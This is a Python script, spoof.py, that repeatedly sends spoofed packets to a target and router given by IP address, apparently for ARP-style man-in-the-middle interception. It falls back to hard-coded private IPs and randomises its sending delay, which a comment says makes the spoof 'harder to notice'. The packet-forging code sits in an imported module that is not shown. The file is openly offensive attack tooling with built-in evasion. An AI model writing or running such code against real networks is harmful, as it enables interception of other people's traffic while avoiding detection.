DEBUG = False

import threading
import sys
import signal
import time
import random

from networking import Spoofer
from http_helper import run_http_server

if (len(sys.argv) != 4):
    # print(f"Wrong usage. Usage- spoof.py <host_ip> <target_ip> <router_ip> and not {sys.argv}")
    # sys.exit(0)
    sys.argv = ["spoof.py", "172.17.170.103","172.17.170.103","172.17.160.1"]




def spoof(spoofer: Spoofer):
    if DEBUG:
        while True:
            print("Sent spoofing packet.... (not really)")
            time.sleep(1)
    else:
        while True:
            spoofer.send_spoofed_packet()
            time.sleep(random.random()/10) # wait a random number between 0-0.1
            # The time.sleep has 2 jobs -
            #   first, make the spoof harder to notice.
            #   second, the terminating signal can only be received if the process is waiting, and not running.
            #       thus, without the time the signal wouldn't be registered.





def main():
    spoofer = Spoofer(*sys.argv[1:])
    spoof(spoofer)


if __name__ == "__main__":
    if DEBUG:
        print("Running spoof.py on debug mode.")
    main()

